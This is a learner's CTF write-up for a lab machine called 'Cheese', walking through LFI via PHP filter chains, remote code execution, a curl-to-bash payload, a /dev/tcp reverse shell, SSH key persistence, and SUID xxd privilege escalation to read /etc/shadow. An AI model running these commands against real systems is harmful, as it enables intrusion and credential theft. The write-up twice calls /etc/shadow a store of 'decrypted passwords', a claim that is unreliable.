# CTF Writeup: Cheese

---

- Step 1: Enumeration -> nmap scan and found all ports open, I am assuming it is some sort of portspoofing
- Step 2: Accessing target ip through browser --> found website --> server is running
- Step 3: Intercepted traffic with running proxy and burp. Tried manipulating data packages, on login.php page --> no result,
tried out if sql injections work with ' but not working.
- Step 4: Used gobuster to search for hidden dir, but my wordlists were very limited. Researched on yt for better wordlists and results.
- Step 5: After looking into many hidden dir's, I found "/messages.html" in which there was a link, which lead me to another hidden dir, in which there was a php script integrated,
in which the php filters were able to execute commands on the web server. And got data from the server --> LFI = Local File Inclusion.
- Step 6: Made "resources=/etc/passwd" so I can see potential passwords and more informations.
Gathered information --> user comte, we have file-read permissions on /etc/passwd
- Step 7: Looked up and installed php filter chain generator tool and generated some filter codes, which also allow me to run reverse shells apparently.
- Step 8: executed command: python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  ' to generate code.
- Step 9: copied php filter code into file= and intercepted the request within burp and also send it to 
repeater and got access to server and a lot of information, now I will need to create a reverse shell.
- Step 10: Looked up google for a php filter reverse shell script -->
found "python3 php_filter_chain_generator.py --chain '<?= `curl -s -L machine_ip/revshell|bash` ?>'"
to generate php filter for an reverse shell
- Step 11: Setting up a listener which receives the reverse connection & starting a web server
to host the shell script
-  Step 12: added bash script within "revshell" file --> bash -i >& /dev/tcp/machine_ip/4444 0>&1
- Step 13: Gained a rev shell and found userflag with in /home/comte, but didn't had permissions to read it.
- Step 14: made ls -la within users and found out that authorized_keys has read and writing permissions --> copied my ssh public key into the authorized_keys
- Step 15: Gained SSH access "ssh chomte@machine_ip". --> cat userflag.txt
- Step 16: sudo -l to see what I am able to run --> lists me options --> gained information about a system called
exploit.timer
- Step 17: within /etc/systemd/ made cat exploit.timer to see the context & made cat exploit.service, and checked out what it does.
- Step 18: It gives everyone who executes it rights to "xxd", tested out the commands which were displayed and
figured out that I Should give the timer a value for example of 3s. Once the timer is over, I am assuming the code
gets executed.
- Step 19: had to educate myself about variable xxd, --> it has the SUID bit set, so we can access the file. 
using "./xxd "/etc/shadow" | xxd -r" it reads the shadow file which stores decrypted passwords, 
converts the passwords to hexa dump format for binarys and xxd -r reconstructs the original files, 
we are able to see the files in there now.
- Step 20: to access root flag we have to make the command: "./xxd "/root/root.txt" | xxd -r"

---

## Key Learnings

- I learned about how to use the repeater in burp properly
- I learned about php filter methods and gained new php filter scripts
- Learned a lot about rev shells
- Gained general knowledge of data flow and data manipulation -> how to test if sql injections work
- Further improve ssh knowledge 
- Learned about sudo -l -> Checks which privileged commands current user is allowed to run.
- Further improved my directory knowledge --> /etc/shadow saves decrypted passwords from users.
